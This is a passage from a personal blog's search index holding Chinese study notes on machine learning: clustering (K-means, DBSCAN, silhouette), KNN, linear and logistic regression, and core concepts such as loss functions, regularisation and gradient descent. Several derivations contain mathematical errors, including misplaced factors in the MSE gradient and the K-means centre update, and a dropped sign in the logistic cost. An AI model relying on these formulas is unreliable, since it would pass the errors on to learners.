\min_{1\leq j\leq K}{|x_i-\mu_j|}$$(3) 更新每个类别的类别中心，将每个类别中心更新为隶属于该类别的所有样本的均值，即$\mu_j=\frac{1}{|C_j|}\cdot\sum_{j\in C_j}{x_i}$，其中$C_j$为第j个类别（或者说簇）； (4) 重复(2)、(3)两步，直到类别中心的变化小于某阈值时结束算法，此时每个样本所属的类别就是最终它所在的分类。 在K均值算法中，通常采用欧氏距离的平方作为样本之间的距离，即：$$dist(X,Y)=\sum_{i=1}^{n}{|x_i-y_i|^2}$$而把样本距其所属类别中心之间的距离之和为损失函数，即：$$W(C)=\sum_{l=1}^K\sum_{C(i)=l}||x_i-\overline{u_l}||^2$$公式中$\overline{\mu_l}$为第l个类别中心，$C(i)=l$表示所属类别为第l个类的样本对应的下标是i。因为每次迭代要求最优的类别中心$\mu_l$，所以上式对$\mu_l$求导为：$$\mu_l:=\frac{2}{n_l}\sum_{C(i)=l}{x_i}$$其中，$n_l$是第l个类别所包含的样本个数。从梯度下降的角度看，上式是每次迭代类别中心应该进行的更新，而从算法流程的角度看，当上式中分子是1时，正好是更新后的类别中心计算公式，即类别中心=样本的均值。 四、层次聚类层次聚类分为聚合的层次聚类和分裂的层次聚类两种。聚合的层次聚类采用一种自下而上的方式，先将每个样本各自分为一个类，之后将距离最近的两个类合并，建立一个新的类，重复以上操作直至满足停止条件。而分裂的层次聚类采用一种自上而下的方式，先将所有样本看作一个类，然后把已有类不断进行划分，形成新的类别，重复以上过程直到满足停止条件，这种方式不常用。聚合的层次聚类示意图如下： 五、密度聚类密度聚类的指导思想是：只要样本点中的密度大于某个阈值，则将该样本添加到最近的簇中。这种聚类算法克服了在使用k-means等基于距离的算法时，只能发现“类圆形”的聚类的缺点，可以发现任意形状的聚类，并且对噪声数据不敏感。 DBSCAN是一种典型的密度聚类算法。DBSCAN是具有噪声的基于密度的聚类算法的缩写（不是数据库扫描的意思），他将簇定义为密度相连的点的最大集合，能够把具有足够高密度的区域划分为簇，并可以在有噪声（即分类结束后不包含在任何簇中的样本）的数据汇总发现任意形状的聚类。算法示意图如下： 1.DBSCAN算法中的若干概念(1)样本的$\varepsilon$-邻域：以给定样本点为中心，以$\varepsilon$为半径的圆形区域； (2)核心对象：如果一个对象的$\varepsilon$-邻域的密度超过某个临界值，即对象的$\varepsilon$-邻域内包含的样本点数量超过某个数值m，则称该对象为核心对象； (3)直接密度可达：给定一个对象集合D，如果样本p是在样本q的$\varepsilon$-邻域内，而样本q是一个核心对象，则称对象p是从对象q出发直接密度可达的； (4)密度可达：对于给定的半径$\varepsilon$和阈值m，如果一个对象$p_1$经过多次直接密度可达$p_n$，其中$p_i\in D (1\leq i \leq n)$, 则称对象$p_n$是从对象$p_1$关于$\varepsilon$和m密度可达的； (5)密度相连：对于给定的半径$\varepsilon$和阈值m，如果存在三个对象p、q和r，满足p和q都是从O关于$\varepsilon$和m密度可达的，那么对象p和q是关于$\varepsilon$和m密度相连的。 2.DBSCAN算法的流程(1)通过计算每个样本点在$\varepsilon$-邻域内的密度，找出所有的核心对象，并把核心对象所在的$\varepsilon$-邻域标记为一个簇； (2)合并所有的核心对象可以密度相连的簇； (3)没有新点可以更新簇时，算法结束。 六、轮廓系数评判一个聚类效果好坏的标准有很多，比较常用的是轮廓系数（silhouette）。 首先记第i个样本到同簇内其他样本的平均距离为$a(i)$，而到其他第j个簇内样本的平均距离为$b(ij)$，$b(i)=\min{(b(i1),b(i2),…,b(ik),)}$，即b(i)为第i个样本到其他簇的平均距离的最小值。则第i个样本的轮廓系数为：$$s(i)=\frac{b(i)-a(i)}{\max{(a(i),b(i))}}$$其中a(i)可以看作是凝聚度，而b(i)可以看作是分离度。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（2）：K近邻（KNN）算法]]></title>
    <url>%2F2019%2F08%2F17%2FKNN%2F</url>
    <content type="text"><![CDATA[本文将讲解有关K近邻算法的相关知识，主要从算法思想、KNN算法三大基本要素以及KNN算法的实现之kd树来做介绍。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ KNN算法思想KNN算法的思想其实非常简单：如果现在有一堆已经标注好类别的样本，然后来了一个新的未标注的样本，让你确定它所属的类别，那么就可以计算已标注样本中离它距离最近的K个样本，那么这K个样本中的大多数所属的分类，就被当作所求样本的分类。 算法示意图如下： 由以上描述可知KNN算法中有三个基本要素：K值的选择、距离度量以及分类决策规则。下面一个个进行说明。 1.K值的选择当K值太小时就意味着整体模型变得复杂，容易导致过拟合。极端情况下，当K值为1时，就成了最近邻算法，只由一个样本点就确定了待分类样本所属的类别，显然有点太草率了。而当K值太大时，与待分类样本相似度很低的样本也会影响到它所属的分类，从而使分类产生错误。极端情况下，当K值为样本数时，则所有待分类样本所属的类别都变成了已标记样本中最多的类别。在实际应用中，K往往会取一个比较小的值。 2.距离度量上面提到要计算距离待分类样本最近的K个样本，而距离的定义又有很多中，其中最常见的是欧式距离，当然还有曼哈顿距离等。 3.分类决策规则KNN算法的分类决策规则多采用多数表决规则，也就是取大多数样本所属的类别作为最终的分类类别。 4.kd树一般情况下，如果要求离某个点距离最近的K个点时，必须先计算出当前点离其他所有点的距离，然后再对距离其进行排序，选出前K个距离最小的点。如果待求的样本点比较多事，就会使时间复杂度很高。为了更加高效的求出距离所求点最近的K个邻居，人们又提出了kd树的概念，不过由于该算法不易理解，而平常也很少用到，想要了解的朋友还请自行百度吧。 感觉本文好短啊……但是KNN算法的确是最简单的一个，而kd树的部分，我又怕自己讲不明白，唉~那就下一篇文章多写点吧。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（1）：线性回归、Logistic回归和softmax回归]]></title>
    <url>%2F2019%2F08%2F15%2Flinear%26logistic%26softmax%2F</url>
    <content type="text"><![CDATA[本文主要讲解线性回归、Logistic回归以及softmax回归的相关知识。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法请参考文章：机器学习概述及基本概念。在用到的时候就不再一一解释了。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 一、线性回归如下图所示， 线性回归（linear regression）就是用一条二维空间或者更高维度空间中的一条直线来拟合给定的样本点，这条直线就是我们根据样本点所建立的线性回归模型。而线性回归要做的就是选择一条最优的直线，或者说选择一组最优的直线参数。其示意图如下： 我们都知道一条平面直线的方程可以写为：$$y=\theta_0+\theta_1x$$其中$\theta$是参数；x是自变量，或者说特征。 推广到n维空间，我们可以得到线性回归的假设函数（模型）为：$$h_\theta(x)=\theta_0x_0+\theta_1x_1+\theta_2x_2+…+\theta_nx_n=\theta^TX$$注意因为是线性的，所以上式中最大是一次项，其中$x_0$是恒等于1的，$\theta^T$就是又各个$\theta$构成的参数向量，X是特征矩阵，即$$\theta^T=(\theta_0,\theta_1,\theta_2,…,\theta_n)$$ $$X=(x_0,x_1,x_2,…,x_n)$$ 模型有了，下一步就是要定义线性回归模型的损失函数，并根据该损失函数确定最优的参数值。上一篇文章提到的损失函数有很多，其中最常用是均方误差（MSE）函数：$$J(\theta)=\frac{1}{2n}\sum_{i=1}^{n}{(h_\theta(x_i)-y_i)^2}=\frac{1}{2n}(h_\theta(x)-y)^2$$严格来说MSE函数的系数应该是$\frac{1}{n}$，上式中的$\frac{1}{2n}$不会影响函数的凹凸性，但是可以让求导之后结果更美观。为了确定梯度下降时参数更新的梯度方向，可以对$J(\theta)$关于$\theta$求导：$$\frac{\partial{J(\theta)}}{\partial \theta_j}=\frac{\partial}{\partial \theta_j}\frac{1}{2n}(h_\theta(x)-y)^2=n(h_\theta(x)-y)\frac{\partial}{\partial \theta_j}(h_\theta(x)-y)$$ $$=n(h_\theta(x)-y)\frac{\partial}{\partial \theta_j}(\sum_{i=0}^{n}\theta_ix_i-y)=n(h_\theta(x)-y)x_j$$ 所以就可以得到梯度下降算法中每次theta的迭代公式： Repeat until convergence{$$\theta_j:=\theta_j-\alpha(h_\theta(x)-y)x_j$$} 迭代公式中原本应该有个系数n，但是可以整合到学习率中去，所以在写的时候就省略掉了。 在得到最终的模型之后，如果要对新的数据进行预测，则只需要把新数据的所有特征输入到这个模型（直线方程）中，则得到的输出就是最后的预测结果。 二、Logistic回归Logistic回归也被译作逻辑斯蒂回归（翻译的真不咋地），虽然叫做回归，但是是一种二分类算法。顾名思义，二分类就是分类结果只有两个的分类，比如把人分为男人和女人。 上面提到的线性回归是不适合做二分类的，而因为Logistic回归的假设函数的取值范围是[0,1]，所以我们就可以取0.5为阈值，将输出值&gt;=0.5的看作正类，反之看作负类。输出值的大小又可以被看作它属于某个分类的可能性大小，显然0.9比0.6更可能属于正类。 Logistic回归的假设函数为：$$h_\theta(x)=g(\theta^TX)$$其中g(z)是sigmoid函数（S型函数），其表达式为：$$g(z)=\frac{1}{1+e^{-z}}$$sigmoid函数的图像如下图所示，可以发现当z&gt;=0时，g(z)&gt;=0.5，为正类，而当z&lt;0时，g(z)&lt;0.5，为负类。 上述假设函数表示某个样本为正类/负类时的概率，Logistic回归模型还有另一种描述形式：$$P(Y=1|x)=\frac{e^{\theta^T X}}{1+e^{\theta^T X}}=\frac{1}{1+e^{-\theta^T X}}$$ $$P(Y=0|x)=\frac{1}{1+e^{\theta^T X}}=\frac{e^{-\theta^T X}}{1+e^{-\theta^T X}}$$ 分别表示某个样本为正类或负类的概率，两者的概率和为1。你会发现这两种不同的模型描述方式其实是等价的。 Logistic回归的损失函数为：$$J(\theta)=\frac{1}{n}\sum_{i=1}^nCost(h_\theta(x_i),y_i)$$其中：$$Cost(h_\theta(x),y)=\begin{cases} -\log(h_\theta(x))，y=1\ -\log(1-h_\theta(x))， y=0\end{cases}$$大家可以尝试分别画出在y=1和y=0时Cost()函数的图像，注意自变量h(x)的取值范围是[0,1]。比如当y=1时，h(x)越趋近于1则损失越趋近于0，反之h(x)越趋近于0，损失越趋近于正无穷。我们还可以将Cost()函数改写为：$$Cost(h(x),y)=y\log(h(x))+(1-y)\log(1-h(x))$$由于y的取值只可能是0或1，所以想要验证上式的正确性可以将y=0和y=1带入到上式。 所以最后的损失函数为：$$J(\theta)=-\frac{1}{n}\sum_{i=1}^{n}{(y_i\log(h(x_i))+(1-y_i)\log(1-h(x_i)))}$$即我们用负的对数似然（NLL）函数作为损失函数，为什么要加负号呢？因为要保证损失函数是凸函数。 同样的，对Logistic回归的损失函数求导后，可以得到梯度下降的参数更新规则： Repeat until convergence{$$\theta_j:=\theta_j-\alpha(h_\theta(x)-y)x_j$$} 大家会发现，会得到一个和线性回归具有相同形式的结论，唯一的区别是两者的假设函数不同。 三、softmax回归现在大家思考一个问题：可不可以用Logistic回归（二分类器）解决多分类问题呢？答案是可以的，因为对于某个分类来说，所有的样本只存在是该分类和不是该分类两种情况。所有当有k个分类时，我们可以创建k个二分类器，分别预测样本属于当前分类的概率，则概率最大的那个分类就被当作该样本的最终分类。 但是这样的方式未免太麻烦了，所以人们又提出了softmax回归作为logistic回归的拓展，用来解决多分类问题。softmax回归又称多项Logistic回归。该部分我还没有理顺，而网上的讲解看起来总是觉得很费劲，所以等我完全理顺后再更新吧。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（0）：机器学习概述及基本概念]]></title>
    <url>%2F2019%2F08%2F12%2Fmachine_learning%2F</url>
    <content type="text"><![CDATA[一、序言机器学习（machine learning）是当前计算机专业的一大热门，也是我研究生几年需要学习的内容之一。虽然之前粗略的学过一点皮毛，但是当初笔记做的实在不好，这次趁着看吴恩达老师的机器学习教学视频以及李航老师的《统计学习方法》，重新整理一下自己的笔记，同时也是整理一下自己的思路。 该系列估计会有10余篇的文章，可能主要包括机器学习的基本知识、线性回归、logistic回归、softmax回归、决策树、随机森林、聚类算法、支持向量机（SVM）、EM算法、隐马尔可夫模型（HMM）等内容。文章的顺序大概会从易到难，从常用到不常用的顺序来写，后期尽量每篇补充几个配套的代码。由于本人比较懒，所以什么时候更新新的文章，就看时间和心情了。 作为该系列的第一篇文章，本文将会介绍机器学习算法的概念，以及凸函数、梯度下降算法、损失函数、正则化有/无监督学习以及最大似然函数等内容。 二、一点建议由我浅薄的机器学习经验来说，我认为机器学习比较适合刚考完研或者大学数学基础比较好的人来学，因为在学习过程中经常会遇到公式的推导，所以学习的人应该有较好的微积分知识（主要是求导）、概率论的基础知识和最大似然估计，以及线性代数中矩阵的逆、转置、乘法等基本运算。在邹博老师的机器学习课上，还介绍了矩阵的求导，这在推导公式也可能会遇到。此外最好有一定的编程基础，可以让算法落地。 三、课程资源我所了解到的机器学习方面比较不错的图书有：周志华的《机器学习》，俗称西瓜书；李航的《统计学习方法》等。我当前正在看《统计学习方法》，里面的机器学习算法大都是从数学的角度进行讲解的，所以需要一定的数学功底，虽然有些地方看不懂，但是感觉讲得真是好，知识点也比较全。有关的教学视频我推荐两个：一个是吴恩达老师的机器学习；另一个是邹博老师的机器学习和深度学习课程。只能说两位老师各有千秋，我一开始看的是邹博老师的，因为他的视频有配套的代码资源，讲的也比较形象，涉及的内容比较广，也比较注重公式推导。而吴恩达老师的比较经典，但是没有配套的代码，有些机器学习算法没有讲到。所以就看大家自己的选择了。另外免费附上一个上述网站对应的邹博机器学习与深度学习2019课件，提取码是：8ykz。 四、机器学习概述首先要明确一点，机器学习和机器人没有半毛钱关系，可以理解为计算机（程序）通过大量的数据不断学习如何解决特定的问题。机器学习是人工智能的一个领域，人们希望通过它来像人类一样较为智能处理各种问题，而我们经常听到的深度学习又是机器学习的一个分支。通过机器学习算法，我们可以解决数据预测、数据分类，甚至是音频、图像等的处理等问题。 有一种有关机器学习的定义是：程序通过利用经验E在解决一个任务T的过程中，性能P得到了一定的改善，则说该程序从经验E中进行了学习。这个定为稍显抽象，举个栗子，如果让程序完成对邮件进行是否是垃圾邮件的分类问题，那么通常我们需要给程序大量的已经标注好的是否是垃圾邮件的邮件，程序通过对其进行分析，并建立数学模型（可以理解为一个有很多参数的数学表达式或概率分布）。对于一个新的邮件，将其输入到该数学模型中，就会得到一个输出，该输出表示是否是垃圾邮件，或者是垃圾邮件的概率。而机器学习的过程就是在构建数学模型的时候程序自动的学习模型的参数的过程。 在学习机器学习时，我们经常会看到类似于下图这样的图片。下图是用机器学习算法预测房价，图中绿线是某个房子的房价随时间的波动情况，而红线是对房价的估计（或者说“拟合”），那么对于一个新的时间点，则只要看对应的红线的值就可以对房价进行预测了。 下图是利用机器学习算法，根据花萼长度和花瓣长度对花进行分类。其中蓝、红、绿三个区域表示预测得到的不同类别所包含的区域，而形状不一的点表示花的真实分类。 五、基本概念下面讲解的概念有点多了，读者可能一时难以消化，当前只需要了解它们分别是做什么用的，以及它们的运行过程是什么样的即可。等后面的讲解提到的时候再来查看也不迟。 1.分类和回归分类（classification）和回归（regression）模型的本质是一样的，其中输入变量和输出变量均为离散变量的预测问题是分类问题，反之，均为连续变量的为回归问题。例如上面提到的对房价的预测就是回归问题，而对花的分类就是分类问题。 2.训练集、测试集和验证集上面提到过，机器学习算法就是用现有的样本构建一个模型，然后用该模型去对新的数据进行预测。那么问题来了，我们用什么来判断预测结果的好坏呢？如果用同样的数据去构建和测试模型显然不合理。这个时候通常把样本划分为训练集（training set）和测试集（test set），其中训练集就是用来训练（构建）模型的那部分样本，而测试集就是测试已经构建的模型好坏的那部分样本。而验证集（validation set）则是在交叉验证时用来挑选最优模型的那部分样本。以上三个集合之间均无交集。 3.交叉验证当已有的样本数据不够多时，为了得到更好的模型就可以采取交叉验证（cross validation）的方式。它的主要思想就是重复的使用样本数据。在简单交叉验证中可以将样本随机划分为训练集和测试集两部分，然后在各种条件（比如不同参数数目）下用训练集训练模型，再用测试集对模型的误差进行评估，从而选出误差最小的模型。除了简单交叉验证之外，还有S折交叉验证和留一交叉验证等，原理都是差不多的，这里就不再赘述了。 4.有/无监督学习有监督学习就是指在对给定的样本构建模型时，给定的样本中包含数据真实的值，也就是说给定的是有标签数据，而无监督学习则正好与之相反。例如在对花分类的例子中，如果只给出每朵花的花萼长度和花瓣长度，而不给出花所属的真实类别，这就属于无监督学习。而如果也给出了花的所属的真实类别，则就是有监督学习。 5.假设函数和损失函数假设函数（hypothesis function）可以理解为我们所构建的模型，可以用$h_\theta(x)$来表示，对于一个输入$ x_i$，则输出为 $h_\theta(x_i)$。其实也可以简写为h(x)。 损失函数（loss function）又称代价函数（cost function）或误差函数，是一种对模型的好坏进行评估的方法，它的做法通常是通过计算真实值与预测值之间的误差来实现。常用的损失函数有很多，例如： (1)均方误差（mean-square error, MSE）函数其公式为：$$MSE=\frac{1}{n}\sum_{i=1}^{n}{(y-\hat{y})^2}$$其中n是样本个数，y和$\hat y$分别是样本的真实值和假设函数所给出的预测值。 0-1损失函数其公式为： 也就是当真实值和预测值相等时损失为0，反之为1。 除此之外，还有交叉熵损失等，这里不再一一赘述。 6.过拟合和正则化为了防止所建立的模型过拟合（overfitting），可以为损失函数增加正则化项。所谓过拟合就是模型对训练集数据预测效果非常好，而对测试集数据则预测效果不好。也可以说泛化能力（对新样本的适应能力）差。如下图中的图c就是过拟合了。 表现在房价预测的例子上就是房价的估值（红线）会经过每一个样本点，但是如果要对新的房价进行预测则效果很差。为什么红线经过每个样本点效果反而变差了呢，这主要是因为模型的复杂度太高了，所以因为增加一个正则化项来对模型的复杂度进行限制，也就是对参数进行惩罚。常用的正则化方式有L1正则和L2正则等。 L1正则：$$L1(\theta)=\sum_{i=1}^{m}|\theta_i|$$ L2正则：$$L2(\theta)=\sum_{i=1}^{m}\theta_i^2$$ 其中$\theta$是模型的参数向量，m是参数的个数。L1正则又称LASSO。 要注意区分损失函数和正则化，正则化是为了防止模型过拟合而对模型复杂度做的惩罚，而损失函数是评判预测结果好坏的标准，损失函数往往由真实值和预测值之间的误差加上正则化项而组成。 7.凸函数和梯度下降机器学习中提到的凸函数（convex function）和平常我们在数学中接触到的凸函数有些不同，机器学习中的凸函数是数学中的下凸函数，这种函数的优势是它只有一个全局最小值点，这为什么是优势还请先来看一下梯度下降算法（gradient descent）的含义。 想象一下你现在在一座山的靠近山顶的位置，如果你想尽快下山，那么一个可行的方法是每次朝高度变化最大的方向（即负梯度方向）走一小步，那么就可以到达一个局部最低点。而从靠近山峰的另一个地方按照该方法下山又可以到达另一个局部最低点。为了获取全局最低点，那么应该要求目标函数（一般指损失函数）是一个凸函数，这样就保证了只有一个全局极（最）小值点。熟悉算法的同学可以理解为这是一个贪心算法，而凸函数则保证了局部最优解就是全局最优解。 梯度下降算法的提出主要是为了可以让计算机迭代的求解模型中参数的最优值，这可以让模型的参数 theta 每次都朝最优的方向更新，通过有限次更新到达最优值。该过程可表示为： Repeat until convergence{$$\theta_j:=\theta_j-\alpha\nabla h_\theta(x)$$} 下三角表示求导，上式表示第j个参数更新为其原来值减去$\alpha$倍的导数方向。$\alpha$又被称为学习率（learning rate），这个概念等以后用到的时候再讲，现在只需要了解它是用来调整每次更新的幅度的。大家可能有个疑问：参数$\theta$的初始值该怎么确定呢？答案是对其进行随机初始化。 在机器学习中，梯度下降算法以及其他优化算法关心的是损失函数在何时取极小值，而并不关心极小值是多少。 如果先计算出所有样本在某点的平均梯度方向再对参数进行更新，则称之为批量梯度下降（batch gradient decline），而如果只用一个样本计算梯度方向并对参数进行更新，则称之为随机梯度下降（stochastic gradient descent，SGD），但是SGD存在模型收敛慢的问题，所以可以取以上两者的折中——mini-batch梯度下降，也就是每次用若干个样本梯度的平均方向作为更新的方向。 8.最小二乘法和正规方程最小二乘法中二乘就是平方的意思，它是指：把使得测量值和真实值之间误差的平方和最小的测量值y当作真实值。可以用公式表示为：$$\min_y(\sum{(y-\hat y)^2})\Rightarrow 真值y$$关于最小二乘法的详细介绍，请参考文章：如何理解最小二乘法？ 在求解最优的参数值时，除了可以用梯度下降算法，还可以用正规方程（normal equation）的方法来进行求解，正规方程和最小二乘法息息相关，如果把最小二乘法的公式写为矩阵的形式，然后对参数$\theta$求导就可以得到以下正规方程的公式，也就是当平方和误差最小时参数的取值：$$\theta=(X^TX)^{-1}X^Ty$$其中，X是m*n的矩阵，即由m个样本，n个特征组成的矩阵，y是m*1的向量，即m个样本的真实值组成的向量。 该方法的优势时不必设置学习率，也不用迭代求解。但是需要求逆矩阵，所以当n比较大（大于1w）时，求解速度很慢。并且不知道大家有没有注意到一个问题，当式子中的逆矩阵不存在时，就不能用上述公式计算了，这时可以用矩阵的伪逆来代替矩阵的逆进行求解。关于伪逆的知识可以自行百度。 9.特征缩放不知道你有没有想过一个问题，当给你一对样本数据，你该怎么对它进行建模呢？首先得确定用哪些特征，比如在房价预测中，可以根据房子的面积、房子的使用年数、离市中心的距离等可以量化的特征来对其价格进行预测。当然选取的特征不是越多越好，必要时还需对其进行筛选。当选取多个特征时，如果特征之间的取值范围相差较大时，就可能会导致梯度下降的速度变慢，所以应该保证特征的取值范围在同一尺度内，取值范围太大或太小都是不好的。这时候就需要对特征进行缩放，可以使用以下公式来实现：$$feature=\frac{feature-mean}{max-min}$$公式中几个标记分别代表特征值、平均值、最大值和最小值 10.极大似然估计极大似然估计又称最大似然估计，“似然”就是“可能性”的意思。它可以解决“模型已定，参数未知”的情况，即当给定一堆样本数据，想要预测它们的模型已经选定，但是最优的参数还没有确定的情况下，就可以用极大似然估计来求解使得模型产生出观测数据的概率最大的最优参数。 设总体样本的概率分布为：p(x;$\theta$)，其中$\theta$是未知参数，则求最大似然估计量的$\theta$一般步骤为： ​ （1）写出似然函数： ​$$L(\theta)=\prod_{i=1}^{n}{p(x_i;\theta)}$$​ （2）对似然函数取对数得$\ln L(\theta)$，并整理; ​ （3）对参数$\theta$求导数，并令其为0:$$\frac{\partial \ln L(\theta)}{\partial \theta_j}=0$$​ （4）解以上似然方程，得到最优的参数$\theta$。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[为自己写个序]]></title>
    <url>%2F2019%2F08%2F12%2Fforeword%2F</url>
    <content type="text"><![CDATA[事情的起因是最近我正在看李航老师的《统计学习方法》，又感觉之前所写的机器学习笔记实在太乱，想着不如发个博客，这样也许还可以帮助其他人。但是又感觉CSDN一直在走下坡路（最近好像有所好转），而别的平台写博客又无心经营。倒不如自己建个个人博客，把文章放上面。奈何本人菜鸡一枚，缺少开发经验，用别人写好的框架搭个破网站还各种磕磕绊绊，花费了几天的时间。 本博客除了会放一些自己研究生期间有关机器学习方面的学习笔记之外，有时间的话还可能会把之前自己在CSDN以及其他平台上，个人觉得写的还不错的有关算法的或者其他知识的文章移植到这边。建个人博客虽然不是什么伟业，但是还是蛮有成就感的……以后博客的域名会改为：zuzhiang.cn，还请大家多多关注~此外自己也是一边学一边写，所以难免有纰漏的地方，还请大家多多担待，多多交流、指正。由于配置过程中遇到了种种问题，所以文章的评论功能暂时关闭。 ​ ——2019.8.12]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
